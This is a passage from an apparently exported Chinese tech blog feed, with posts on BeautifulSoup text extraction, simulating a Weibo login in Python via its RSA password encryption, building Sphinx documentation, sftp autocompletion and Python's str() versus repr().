<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>     woodenrobot       <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>   woodenrobot1<span class="tag">&lt;<span class="name">em</span>&gt;</span>  woodenrobot2  <span class="tag">&lt;/<span class="name">em</span>&gt;</span>  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><h2 id="对于例1"><a href="#对于例1" class="headerlink" title="对于例1"></a>对于例1</h2><p>如果遇到例1这种情况下面几种方法可以通用。  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">html = <span class="string">&#x27;&lt;p&gt;     woodenrobot       &lt;/p&gt;&#x27;</span></span><br><span class="line">soup = BeautifulSoup(html)</span><br><span class="line"></span><br><span class="line">a = soup.get_text()</span><br><span class="line">b = soup.get_text().strip()</span><br><span class="line">c = soup.get_text(strip=<span class="literal">True</span>)</span><br><span class="line">d = soup.strings</span><br><span class="line">e = soup.stripped_strings</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a: %s\nb: %s\nc: %s\nd: %s\ne: %s&#x27;</span> % (a, b, c, <span class="built_in">list</span>(d), <span class="built_in">list</span>(e)))</span><br></pre></td></tr></table></figure>
<p>输出结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:    woodenrobot  </span><br><span class="line">b: woodenrobot</span><br><span class="line">c: woodenrobot</span><br><span class="line">d: [&#x27;   woodenrobot  &#x27;]</span><br><span class="line">e: [&#x27;woodenrobot&#x27;]</span><br></pre></td></tr></table></figure>
<p>其中a与d未处理去掉首尾空格，d, e是遍历整个子孙节点得到一个生成器。  </p>
<h2 id="对于例2"><a href="#对于例2" class="headerlink" title="对于例2"></a>对于例2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">html = <span class="string">&#x27;&lt;p&gt;   woodenrobot1&lt;em&gt;   woodenrobot2  &lt;/em&gt;  &lt;/p&gt;&#x27;</span></span><br><span class="line">soup = BeautifulSoup(html)</span><br><span class="line"></span><br><span class="line">a = soup.get_text()</span><br><span class="line">b = soup.get_text().strip()</span><br><span class="line">c = soup.get_text(strip=<span class="literal">True</span>)</span><br><span class="line">d = soup.strings</span><br><span class="line">e = soup.stripped_strings</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a: %s\nb: %s\nc: %s\nd: %s\ne: %s&#x27;</span> % (a, b, c, <span class="built_in">list</span>(d), <span class="built_in">list</span>(e)))</span><br></pre></td></tr></table></figure>
<p>输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:    woodenrobot1  woodenrobot2   </span><br><span class="line">b: woodenrobot1  woodenrobot2</span><br><span class="line">c: woodenrobot1woodenrobot2</span><br><span class="line">d: [&#x27;   woodenrobot1&#x27;, &#x27;  woodenrobot2  &#x27;, &#x27; &#x27;]</span><br><span class="line">e: [&#x27;woodenrobot1&#x27;, &#x27;woodenrobot2&#x27;]</span><br></pre></td></tr></table></figure>
<p>通过结果我们知道对于复杂一点的特殊结构这个三种方法还是有一些差异存在，所以我们需要根据不同的需求选择不同的方法。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>用Python模拟登陆微博</title>
    <url>/2016/03/22/%E7%94%A8Python%E6%A8%A1%E6%8B%9F%E7%99%BB%E9%99%86%E5%BE%AE%E5%8D%9A/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在研究模拟登陆，看了很多教程，发现基本上都是只教怎么处理后就能登陆成功，没有讲解怎样得到处理的方法。经过的一天的研究，把微博模拟登陆基本上弄清楚了，下面就把过程详细说明。</p>
<span id="more"></span>
<hr>
<h1 id="工具和环境"><a href="#工具和环境" class="headerlink" title="工具和环境"></a>工具和环境</h1><p>1.语言：Python3<br>2.IDE： Pycharm<br>3.浏览器：Chrome<br>4.使用的库：re, rsa, base64, requests, PIL, urllib</p>
<hr>
<h1 id="模拟登陆过程"><a href="#模拟登陆过程" class="headerlink" title="模拟登陆过程"></a>模拟登陆过程</h1><h2 id="弄清楚所需的数据"><a href="#弄清楚所需的数据" class="headerlink" title="弄清楚所需的数据"></a>弄清楚所需的数据</h2><p>首先我们在Chrome浏览器中打开<a href="http://weibo.com/">微博登陆界面</a>，然后<code>Ctrl+shift+i</code>开启开发者工具，在开发者工具的<code>Network</code>选项里找到<code>Preserve log</code>并勾选，然后登录你的微博。之后可以看到以下界面：<br><img src="/images/%E5%BE%AE%E5%8D%9A%E6%A8%A1%E6%8B%9F%E7%99%BB%E9%99%86QQ%E6%88%AA%E5%9B%BE20160322120058.png"><br>我们可以看到<code>Network</code>下面这么多文件，到底哪一个是我们需要的呢？由于登陆的时候需要向服务器输送数据所以我们限定搜索范围，去找<code>Method</code>为<code>POST</code>的这时你会找到<code>login.php?client=ssologin.js(v1.4.18)</code>点击找到它的<code>form data</code>看到下列数据：<br><img src="/images/%E5%BE%AE%E5%8D%9A%E6%A8%A1%E6%8B%9F%E7%99%BB%E9%99%86QQ%E6%88%AA%E5%9B%BE20160322113625.png"><br>其中大部分数据都是固定数据，只有<code>su</code>，<code>servertime</code>，<code>nonce</code>，<code>rsakv</code>，<code>sp</code>是通过JS加载得到。<code>su</code>就是账户经过加密而得，<code>sp</code>是密码经过加密而得。我们只需要找到这几个数据就可以模拟登录到微博，那么怎么找到这些数据呢？接着往下看…</p>
<h2 id="获取servertime-nonce等数据"><a href="#获取servertime-nonce等数据" class="headerlink" title="获取servertime,nonce等数据"></a>获取servertime,nonce等数据</h2><p>在登录页面里打开开发者工具，清除<code>Network</code>里的数据。这个时候输入你的账号并按回车键。你会神奇地发现出现了一条数据，点击选择<code>Preview</code>看看里面有什么？<br><img src="/images/%E5%BE%AE%E5%8D%9A%E6%A8%A1%E6%8B%9F%E7%99%BB%E9%99%86QQ%E6%88%AA%E5%9B%BE20160322135146.png"><br>是不是有些熟悉的字眼。你要做的就是把这里面的数据用代码爬取下来，但是通过对它<code>Headers</code>里面的<code>Query String Parametes</code>进行观察，我们发现爬取这个页面还需要知道<code>su</code>的值，所以先别急，继续登陆。我们可以再它下面发现一条名叫<code>ssologin.js</code>的数据，右键选择<code>open link in the new tab</code>你会发现新打开的窗口下式很多的代码，稍加整理就可以找到对账号和密码加密处理的部分。</p>
<h2 id="账号与密码的加密"><a href="#账号与密码的加密" class="headerlink" title="账号与密码的加密"></a>账号与密码的加密</h2><h3 id="账号的加密"><a href="#账号的加密" class="headerlink" title="账号的加密"></a>账号的加密</h3><p><img src="/images/%E5%BE%AE%E5%8D%9A%E6%A8%A1%E6%8B%9F%E7%99%BB%E9%99%86QQ%E6%88%AA%E5%9B%BE20160322141216.png"><br>这是我找到的账号加密代码，<code>su</code>是账号首先经过html字符转义再转成base64编码。知道了这点我们就可以通过代码实现对账号的加密获取<code>su</code>值。</p>
<h3 id="密码的加密"><a href="#密码的加密" class="headerlink" title="密码的加密"></a>密码的加密</h3><p><img src="/images/%E5%BE%AE%E5%8D%9A%E6%A8%A1%E6%8B%9F%E7%99%BB%E9%99%86QQ%E6%88%AA%E5%9B%BE20160322140451.png"><br>上图为密码加密部分。里面的数据除了<code>rsaPubkey</code>之外我们都有了，我们可以在找到<code>nonce</code>值的地方找到一个<code>pubkey</code>，这个值就是<code>rsaPubkey</code>。<br>关于密码的加密代码中显示有两种方式，判断的标准是<code>pwencode</code>的值。我们登录时一般为<code>rsa2</code>所以选用第一种加密方式。至于第二种加密方式是否适用大家可以去尝试尝试。<br>其中<code>10001</code>和 <code>rsaPubkey</code>为16进制需要通过<code>int(x, 16)</code>转换为十进制。接着经过<code>servertime + &#39;\t&#39; + nonce + &#39;\n&#39; + passwd</code>拼接字符串再进行Rsa加密, 最后转成16进制即得到<code>sp</code>。</p>
<h3 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h3><p>经过上面的努力我们已经把所需要的数据统统获取，下面只要上传数据到服务器就可以登录了。<br><strong><em>注意登陆全程需在requests的session下进行</em></strong><br>首先，将登录时所需要的值（就是第二张图里的值）<code>post</code>到<code>http://login.sina.com.cn/sso/login.php?client=ssologin.js(v1.4.18)</code>，你会得到一个页面提取页面里的重定向地址(大概这个样子<code>http://passport.weibo.com/wbsso/login?后面一堆参数省略</code>）,<code>get</code>这个地址得到这些内容就代表你登录成功啦。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&#x27;javascript&#x27;</span>&gt;</span><span class="language-javascript">parent.<span class="property">sinaSSOController</span>.<span class="title function_">feedBackUrlCallBack</span>(&#123;<span class="string">&quot;result&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;userinfo&quot;</span>:&#123;<span class="string">&quot;uniqueid&quot;</span>:<span class="string">&quot;1561651905&quot;</span>,<span class="string">&quot;userid&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;displayname&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;userdomain&quot;</span>:<span class="string">&quot;?wvr=5&amp;lf=reg&quot;</span>&#125;&#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>提取你自己的uniqueid值放入下列网址中<code>get</code>得到你的微博主页信息。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">uniqueid = **********</span><br><span class="line">weibo_url = &#x27;http://weibo.com/%s/profile?topnav=1&amp;wvr=6&amp;is_all=1&#x27; % uniqueid</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>本教程仅用于学习交流</strong><br>方法已经写出来了，大家多去自己尝试一下。如果实在写不出来可以到我的GitHub参考我写好的代码。<br>代码地址：<a href="https://github.com/Wooden-Robot/pop">https://github.com/Wooden-Robot/pop</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>用Sphinx快速制作文档</title>
    <url>/2017/06/25/%E7%94%A8Sphinx%E5%BF%AB%E9%80%9F%E5%88%B6%E4%BD%9C%E6%96%87%E6%A1%A3/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Sphinx 是一种文档工具，它可以令人轻松的撰写出清晰且优美的文档, 由 Georg Brandl 在BSD 许可证下开发. <a href="https://docs.python.org/3/">新版的Python文档</a>就是由Sphinx生成的， 并且它已成为Python项目首选的文档工具,同时它对 C/C++ 项目也有很好的支持; 并计划对其它开发语言添加特殊支持. 本站当然也是使用 Sphinx 生成的，它采用reStructuredText! Sphinx还在继续开发. 下面列出了其良好特性,这些特性在Python官方文档中均有体现:</p>
<ul>
<li><p>丰富的输出格式: 支持 HTML (包括 Windows 帮助文档), LaTeX (可以打印PDF版本), manual pages（man 文档）, 纯文本</p>
</li>
<li><p>完备的交叉引用: 语义化的标签,并可以自动化链接函数,类,引文,术语及相似的片段信息</p>
</li>
<li><p>明晰的分层结构: 可以轻松的定义文档树,并自动化链接同级/父级/下级文章</p>
</li>
<li><p>美观的自动索引: 可自动生成美观的模块索引</p>
</li>
<li><p>精确的语法高亮: 基于 Pygments 自动生成语法高亮</p>
</li>
<li><p>开放的扩展: 支持代码块的自动测试,并包含Python模块的自述文档(API docs)等  </p>
<p>Sphinx 使用 reStructuredText 作为标记语言, 可以享有 Docutils 为reStructuredText提供的分析，转换等多种工具.</p>
<span id="more"></span>
<h1 id="安装Sphinx"><a href="#安装Sphinx" class="headerlink" title="安装Sphinx"></a>安装Sphinx</h1><p>Sphinx为Python语言的一个第三方库。我们需要在终端中输入下列命令进行安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install sphinx</span><br></pre></td></tr></table></figure>
<h1 id="创建Sphinx项目"><a href="#创建Sphinx项目" class="headerlink" title="创建Sphinx项目"></a>创建Sphinx项目</h1><p>创建一个用于存放文档的文件夹，然后在该文件夹路径下运行下列命令快速生成Sphinx项目：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sphinx-quickstart</span><br></pre></td></tr></table></figure>
<p>接下来会让你选择一些配置：</p>
</li>
</ul>
<ol>
<li>设置文档的根路径（回车，使用默认设置）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enter the root path for documentation.</span><br><span class="line">&gt; Root path for the documentation [.]:</span><br></pre></td></tr></table></figure></li>
<li>是否分离source和build目录（输入y,选择分离，方便管理）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have two options for placing the build directory for Sphinx output.</span><br><span class="line">Either, you use a directory &quot;_build&quot; within the root path, or you separate</span><br><span class="line">&quot;source&quot; and &quot;build&quot; directories within the root path.</span><br><span class="line">&gt; Separate source and build directories (y/n) [n]:</span><br></pre></td></tr></table></figure></li>
<li>设定模板前缀（回车，使用默认选项）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Inside the root directory, two more directories will be created; &quot;_templates&quot;</span><br><span class="line">for custom HTML templates and &quot;_static&quot; for custom stylesheets and other static</span><br><span class="line">files. You can enter another prefix (such as &quot;.&quot;) to replace the underscore.</span><br><span class="line">&gt; Name prefix for templates and static dir [_]:</span><br></pre></td></tr></table></figure></li>
<li>输入项目名称和作者<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The project name will occur in several places in the built documentation.</span><br><span class="line">&gt; Project name: Sphinx-test</span><br><span class="line">&gt; Author name(s): test</span><br></pre></td></tr></table></figure></li>
<li>输入项目版本号<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sphinx has the notion of a &quot;version&quot; and a &quot;release&quot; for the</span><br><span class="line">software. Each version can have multiple releases. For example, for</span><br><span class="line">Python the version is something like 2.5 or 3.0, while the release is</span><br><span class="line">something like 2.5.1 or 3.0a1.  If you don&#x27;t need this dual structure,</span><br><span class="line">just set both to the same value.</span><br><span class="line">&gt; Project version []: 1.0.0</span><br><span class="line">&gt; Project release [1.0.0]:</span><br></pre></td></tr></table></figure></li>
<li>文档语言（回车，默认即可）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">If the documents are to be written in a language other than English,</span><br><span class="line">you can select a language here by its language code. Sphinx will then</span><br><span class="line">translate text that it generates into that language.</span><br><span class="line"></span><br><span class="line">For a list of supported codes, see</span><br><span class="line">http://sphinx-doc.org/config.html#confval-language.</span><br><span class="line">&gt; Project language [en]:</span><br></pre></td></tr></table></figure></li>
<li>设定文档文就按的后缀<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The file name suffix for source files. Commonly, this is either &quot;.txt&quot;</span><br><span class="line">or &quot;.rst&quot;.  Only files with this suffix are considered documents.</span><br><span class="line">&gt; Source file suffix [.rst]:</span><br></pre></td></tr></table></figure></li>
<li>设定首页名称（回车，选择默认index即可）<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">One document is special in that it is considered the top node of the</span><br><span class="line">&quot;contents tree&quot;, that is, it is the root of the hierarchical structure</span><br><span class="line">of the documents. Normally, this is &quot;index&quot;, but if your &quot;index&quot;</span><br><span class="line">document is a custom template, you can also set this to another filename.</span><br><span class="line">&gt; Name of your master document (without suffix) [index]:</span><br></pre></td></tr></table></figure></li>
<li>根据需要选择是否开启epub输出(一般用不到，回车默认不开启即可)<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sphinx can also add configuration for epub output:</span><br><span class="line">&gt; Do you want to use the epub builder (y/n) [n]:</span><br></pre></td></tr></table></figure></li>
<li>根据需求选择是否开启相应的Sphinx拓展功能<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Please indicate if you want to use one of the following Sphinx extensions:</span><br><span class="line">&gt; autodoc: automatically insert docstrings from modules (y/n) [n]: y</span><br><span class="line">&gt; doctest: automatically test code snippets in doctest blocks (y/n) [n]: y</span><br><span class="line">&gt; intersphinx: link between Sphinx documentation of different projects (y/n) [n]: y</span><br><span class="line">&gt; todo: write &quot;todo&quot; entries that can be shown or hidden on build (y/n) [n]: y</span><br><span class="line">&gt; coverage: checks for documentation coverage (y/n) [n]: y</span><br><span class="line">&gt; imgmath: include math, rendered as PNG or SVG images (y/n) [n]: y</span><br><span class="line">&gt; mathjax: include math, rendered in the browser by MathJax (y/n) [n]: y</span><br><span class="line">Note: imgmath and mathjax cannot be enabled at the same time.</span><br><span class="line">imgmath has been deselected.</span><br><span class="line">&gt; ifconfig: conditional inclusion of content based on config values (y/n) [n]: y</span><br><span class="line">&gt; viewcode: include links to the source code of documented Python objects (y/n) [n]: y</span><br><span class="line">&gt; githubpages: create .nojekyll file to publish the document on GitHub pages (y/n) [n]: n</span><br></pre></td></tr></table></figure></li>
<li>创建项目<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A Makefile and a Windows command file can be generated for you so that you</span><br><span class="line">only have to run e.g. `make html&#x27; instead of invoking sphinx-build</span><br><span class="line">directly.</span><br><span class="line">&gt; Create Makefile? (y/n) [y]: y</span><br><span class="line">&gt; Create Windows command file? (y/n) [y]: y</span><br><span class="line"></span><br><span class="line">Creating file ./conf.py.</span><br><span class="line">Creating file ./index.rst,.md.</span><br><span class="line">Creating file ./Makefile.</span><br><span class="line">Creating file ./make.bat.</span><br><span class="line"></span><br><span class="line">Finished: An initial directory structure has been created.</span><br><span class="line"></span><br><span class="line">You should now populate your master file ./index.rst,.md and create other documentation</span><br><span class="line">source files. Use the Makefile to build the docs, like so:</span><br><span class="line">   make builder</span><br><span class="line">where &quot;builder&quot; is one of the supported builders, e.g. html, latex or linkcheck.</span><br></pre></td></tr></table></figure>
项目创建以后目录结构如下所示:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── Makefile</span><br><span class="line">├── build</span><br><span class="line">├── make.bat</span><br><span class="line">└── source</span><br><span class="line">    ├── _static</span><br><span class="line">    ├── _templates</span><br><span class="line">    ├── conf.py</span><br><span class="line">    └── index.rst</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><strong>build</strong>:用来存放通过make html生成文档网页文件的目录</li>
<li><strong>source</strong>：存放用于生成文档的源文件</li>
<li><strong>conf.py</strong>: Sphinx的配置文件</li>
<li><strong>index.rst</strong>: 主文档<h1 id="定义文档结构"><a href="#定义文档结构" class="headerlink" title="定义文档结构"></a>定义文档结构</h1>主文档index.rst的主要功能是被转换成欢迎页, 它包含一个目录表（ “table of contents tree”或者 toctree ). Sphinx 主要功能是使用 reStructuredText, 把许多文件组织成一份结构合理的文档.</li>
</ul>
<p>toctree指令初始值如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.. toctree::</span><br><span class="line">   :maxdepth: 2</span><br></pre></td></tr></table></figure>
<p>你可以在 content 的位置添加文档列表:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.. toctree::</span><br><span class="line">   :maxdepth: 2</span><br><span class="line"></span><br><span class="line">   tutorial.md</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
<p>注：文档文件放在与index.rst同级目录下。</p>
<h1 id="支持markdown文件、更改文档主题"><a href="#支持markdown文件、更改文档主题" class="headerlink" title="支持markdown文件、更改文档主题"></a>支持markdown文件、更改文档主题</h1><p>Spinx本身不支持.md文件生成文档，需要我们使用第三方库recommonmark进行转换。<br>首先分别运行下列命令安装recommonmark与sphinx_rtd_theme库。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install recommonmark</span><br><span class="line"></span><br><span class="line">pip install sphinx_rtd_theme</span><br></pre></td></tr></table></figure>
<p>安装好，在conf.py中修改下列两个配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source_suffix = [&#x27;.rst&#x27;, &#x27;.md&#x27;, &#x27;.MD&#x27;]</span><br><span class="line">html_theme = &#x27;sphinx_rtd_theme&#x27;</span><br></pre></td></tr></table></figure>
<p>并新增：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source_parsers = &#123;</span><br><span class="line">    &#x27;.md&#x27;: CommonMarkParser,</span><br><span class="line">    &#x27;.MD&#x27;: CommonMarkParser,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="生成文档"><a href="#生成文档" class="headerlink" title="生成文档"></a>生成文档</h1><p>在Sphinx项目所在的文件夹路径下运行下列命令生成文档：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make html</span><br></pre></td></tr></table></figure>
<p>生成后的文档位于build/html文件夹内，用浏览器打开index.html即可看到生成后的文档。</p>
<hr>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ol>
<li><a href="http://zh-sphinx-doc.readthedocs.io/en/latest/index.html">Sphinx 使用手册</a></li>
<li><a href="https://www.ibm.com/developerworks/cn/opensource/os-sphinx-documentation">使用 sphinx 制作简洁而又美观的文档</a></li>
<li><a href="https://www.biaodianfu.com/sphinx-documentation.html">使用Sphinx制作说明文档</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>让 sftp 支持自动补全</title>
    <url>/2019/07/03/%E8%AE%A9-sftp-%E6%94%AF%E6%8C%81%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>用惯了自动补全，进入 sftp 后无法使用自动补全非常不方便，记录一下改造过程。</p>
<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><ol>
<li>首先安装 <code>with-readline</code></li>
<li>然后在 <code>zsh</code> 或者 <code>bash</code> 配置文件中添加：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开配置文件</span></span><br><span class="line">vim .zshrc <span class="comment"># zsh 配置文件</span></span><br><span class="line"><span class="comment"># vim .bash_profile  # bash 配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加下列内容</span></span><br><span class="line"><span class="built_in">alias</span> sftp=<span class="string">&#x27;with-readline sftp&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>使配置生效<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br><span class="line"><span class="comment"># source ~/.bash_profile </span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://github.com/ewxrjk/with-readline">with-readline</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>谈一谈Python中str()和repr()的区别</title>
    <url>/2016/03/07/%E8%B0%88%E4%B8%80%E8%B0%88Python%E4%B8%ADstr()%E5%92%8Crepr()%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在学习BeautifulSoup文档的时候发现了一个以前不常见的Python内建函数<code>repr()</code>，带着好奇对这个内建函数进行了一番搜索和学习。</p>
<span id="more"></span>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><code>str()</code>与<code>repr()</code>都是Python的内建函数,通过它们可以方便地以字符串的方式获取对象的内容、类型、数值属性等信息。大多数情况下他们的效果相同，但是既然是不同的函数肯定有不同的地方，概括起来可以这样说<code>str()</code>会将对象转化为可读性较好的字符串，而<code>repr()</code>会将对象转化为供解释器读取形式的字符串。一个对象没有适于人阅读的解释形式的话，<code>str()</code>会返回与<code>repr()</code>相同的值。<br>其中，数值或list、tuple、字典等这样的结构，针对各种函数都有着统一的解读方式。而字符串不同函数可能有着不同的解读方式。</p>
<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><ol>
<li>在下列情况下两者效果相同： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(<span class="number">123</span>)</span><br><span class="line"><span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">repr</span>(<span class="number">123</span>)</span><br><span class="line"><span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>((<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>))</span><br><span class="line"><span class="string">&#x27;(1, 2, 3, 4, 5)&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">repr</span>((<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>))</span><br><span class="line"><span class="string">&#x27;(1, 2, 3, 4, 5)&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="string">&#x27;[1, 2, 3, 4, 5]&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">repr</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="string">&#x27;[1, 2, 3, 4, 5]&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(&#123;<span class="number">1</span>: <span class="number">2</span>, <span class="number">3</span>: <span class="number">4</span>&#125;)</span><br><span class="line"><span class="string">&#x27;&#123;1: 2, 3: 4&#125;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">repr</span>(&#123;<span class="number">1</span>: <span class="number">2</span>, <span class="number">3</span>: <span class="number">4</span>&#125;)</span><br><span class="line"><span class="string">&#x27;&#123;1: 2, 3: 4&#125;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(<span class="number">4.53</span>-<span class="number">2j</span>)</span><br><span class="line"><span class="string">&#x27;(4.53-2j)&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">repr</span>(<span class="number">4.53</span>-<span class="number">2j</span>)</span><br><span class="line"><span class="string">&#x27;(4.53-2j)&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(<span class="number">2e10</span>)</span><br><span class="line"><span class="string">&#x27;20000000000.0&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">repr</span>(<span class="number">2e10</span>)</span><br><span class="line"><span class="string">&#x27;20000000000.0&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>下列情况两者效果出现差异：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;hi = <span class="string">&#x27;hello world\n Python&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hi</span><br><span class="line"><span class="string">&#x27;hello world\n Python&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="built_in">str</span>(hi))</span><br><span class="line">hello world</span><br><span class="line"> Python</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="built_in">repr</span>(hi))</span><br><span class="line"><span class="string">&#x27;hello world\n Python&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Scrapy爬虫框架教程（二）-- 爬取豆瓣电影TOP250</title>
    <url>/2017/01/07/Scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89-%E7%88%AC%E5%8F%96%E8%B1%86%E7%93%A3%E7%94%B5%E5%BD%B1TOP250/</url>
